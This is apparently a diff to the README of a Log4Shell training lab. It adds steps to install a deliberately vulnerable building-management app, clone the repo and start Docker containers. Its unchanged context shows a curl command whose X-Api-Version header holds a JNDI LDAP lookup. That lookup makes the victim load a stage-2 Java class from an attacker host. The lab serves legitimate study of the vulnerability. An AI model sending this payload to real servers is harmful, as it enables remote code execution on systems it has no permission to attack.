@@ -36,25 +36,23 @@ M75-LOG4J-VULNERABILITY
 
 1. Download and install the vulnerable web app.
 ```bash
-wget -O /tmp/buildingmgmt.deb 
-apt install /tmp/buildingmgmt.deb
+wget -O /tmp/buildingmgmt.deb https://github.com/sintax1/M75-log4j-vuln/blob/master/victim/buildingmgmt.1.0-1.deb?raw=true
+sudo apt install /tmp/buildingmgmt.deb
 ```
 
 ## Attacker
 
-## Development
-
-### Victim
-
 1. clone the source repo onto the attacker VM.
 
 ```
-
+git clone https://github.com/sintax1/M75-log4j-vuln.git
 ```
 
 2. Build and run the docker containers.
 
 ```
+cd M75-log4j-vuln/victim
+docker-compose up --build
 ```
 
 3. Launch the exploit.
@@ -68,10 +66,17 @@ STAGE2_JAVA_CLASS_NAME=Plugin
 curl ${VICTIM}:${VICTIM_VULN_PORT} -H 'X-Api-Version: ${jndi:ldap://${ATTACKER}:${LDAP_PORT}/${STAGE2_JAVA_CLASS_NAME}}'
 ```
 
+# Development
+
+## Victim
+
 ### Build .deb package
 
 ```bash
-victim % make build
+cd victim
+make build
+
+-- output --
 cd log4shell-vulnerable-app; gradle bootJar --no-daemon
 To honour the JVM settings for this build a single-use Daemon process will be forked. See https://docs.gradle.org/7.4.1/userguide/gradle_daemon.html#sec:disabling_the_daemon.
 Daemon will be stopped at the end of the build 
